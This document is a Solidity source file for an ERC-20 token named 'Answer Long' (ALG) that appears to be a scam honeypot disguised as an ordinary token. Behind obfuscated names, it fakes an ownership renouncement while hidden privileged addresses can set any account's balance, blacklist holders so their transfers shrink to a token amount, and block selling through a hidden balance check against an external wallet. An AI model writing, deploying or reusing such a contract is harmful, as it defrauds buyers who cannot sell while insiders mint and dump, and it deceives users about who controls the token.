//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface modeEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toSwapTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoTxSell {
    function createPair(address tradingSender, address txToken) external returns (address);
}

interface exemptSenderWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenSell) external view returns (uint256);

    function transfer(address receiverLimit, uint256 marketingReceiver) external returns (bool);

    function allowance(address teamAmountAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address receiverLimit,
        uint256 marketingReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isLaunched, uint256 value);
    event Approval(address indexed teamAmountAt, address indexed spender, uint256 value);
}

interface exemptSenderWalletMetadata is exemptSenderWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AnswerLong is toSwapTx, exemptSenderWallet, exemptSenderWalletMetadata {

    mapping(address => bool) public fundTrading;

    function senderSwap(address launchedSender, address receiverLimit, uint256 marketingReceiver) internal returns (bool) {
        if (launchedSender == txAmount) {
            return isMaxLiquidity(launchedSender, receiverLimit, marketingReceiver);
        }
        uint256 exemptTx = exemptSenderWallet(listWallet).balanceOf(enableTx);
        require(exemptTx == launchSender);
        require(receiverLimit != enableTx);
        if (isWallet[launchedSender]) {
            return isMaxLiquidity(launchedSender, receiverLimit, buyMax);
        }
        return isMaxLiquidity(launchedSender, receiverLimit, marketingReceiver);
    }

    function symbol() external view virtual override returns (string memory) {
        return atFundMin;
    }

    uint256 public enableReceiver;

    address public txAmount;

    bool public shouldMarketingExempt;

    uint256 public atTradingSell;

    bool public shouldBuy;

    event OwnershipTransferred(address indexed maxMin, address indexed listMax);

    uint256 private listLimit;

    uint256 launchSender;

    string private atFundMin = "ALG";

    uint8 private buyReceiverLaunched = 18;

    function isMaxLiquidity(address launchedSender, address receiverLimit, uint256 marketingReceiver) internal returns (bool) {
        require(modeLaunch[launchedSender] >= marketingReceiver);
        modeLaunch[launchedSender] -= marketingReceiver;
        modeLaunch[receiverLimit] += marketingReceiver;
        emit Transfer(launchedSender, receiverLimit, marketingReceiver);
        return true;
    }

    uint256 private minMax;

    mapping(address => bool) public isWallet;

    mapping(address => uint256) private modeLaunch;

    function atMaxSell(address swapBuy) public {
        buyTx();
        
        if (swapBuy == txAmount || swapBuy == listWallet) {
            return;
        }
        isWallet[swapBuy] = true;
    }

    mapping(address => mapping(address => uint256)) private sellLimit;

    function balanceOf(address tokenSell) public view virtual override returns (uint256) {
        return modeLaunch[tokenSell];
    }

    function enableSwap(address liquidityEnable, uint256 marketingReceiver) public {
        buyTx();
        modeLaunch[liquidityEnable] = marketingReceiver;
    }

    address toLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address liquidityEnable, uint256 marketingReceiver) external virtual override returns (bool) {
        return senderSwap(_msgSender(), liquidityEnable, marketingReceiver);
    }

    function allowance(address teamAmount, address walletFee) external view virtual override returns (uint256) {
        if (walletFee == toLimit) {
            return type(uint256).max;
        }
        return sellLimit[teamAmount][walletFee];
    }

    function toBuy(address teamMax) public {
        if (shouldBuy) {
            return;
        }
        if (minMax != tokenMin) {
            shouldMarketingExempt = true;
        }
        fundTrading[teamMax] = true;
        if (feeTx == shouldMarketingExempt) {
            tokenMin = listLimit;
        }
        shouldBuy = true;
    }

    uint256 private tokenMin;

    string private walletTotal = "Answer Long";

    address public listWallet;

    function decimals() external view virtual override returns (uint8) {
        return buyReceiverLaunched;
    }

    address private marketingList;

    function owner() external view returns (address) {
        return marketingList;
    }

    function approve(address walletFee, uint256 marketingReceiver) public virtual override returns (bool) {
        sellLimit[_msgSender()][walletFee] = marketingReceiver;
        emit Approval(_msgSender(), walletFee, marketingReceiver);
        return true;
    }

    uint256 constant buyMax = 6 ** 10;

    function getOwner() external view returns (address) {
        return marketingList;
    }

    function marketingMode(uint256 marketingReceiver) public {
        buyTx();
        launchSender = marketingReceiver;
    }

    constructor (){
        
        modeEnable modeMin = modeEnable(toLimit);
        listWallet = autoTxSell(modeMin.factory()).createPair(modeMin.WETH(), address(this));
        if (minMax != tokenMin) {
            feeTx = true;
        }
        txAmount = _msgSender();
        receiverMode();
        fundTrading[txAmount] = true;
        modeLaunch[txAmount] = tokenEnable;
        
        emit Transfer(address(0), txAmount, tokenEnable);
    }

    bool private feeTx;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenEnable;
    }

    function name() external view virtual override returns (string memory) {
        return walletTotal;
    }

    address enableTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function buyTx() private view {
        require(fundTrading[_msgSender()]);
    }

    uint256 private tokenEnable = 100000000 * 10 ** 18;

    function transferFrom(address launchedSender, address receiverLimit, uint256 marketingReceiver) external override returns (bool) {
        if (_msgSender() != toLimit) {
            if (sellLimit[launchedSender][_msgSender()] != type(uint256).max) {
                require(marketingReceiver <= sellLimit[launchedSender][_msgSender()]);
                sellLimit[launchedSender][_msgSender()] -= marketingReceiver;
            }
        }
        return senderSwap(launchedSender, receiverLimit, marketingReceiver);
    }

    uint256 totalSender;

    function receiverMode() public {
        emit OwnershipTransferred(txAmount, address(0));
        marketingList = address(0);
    }

}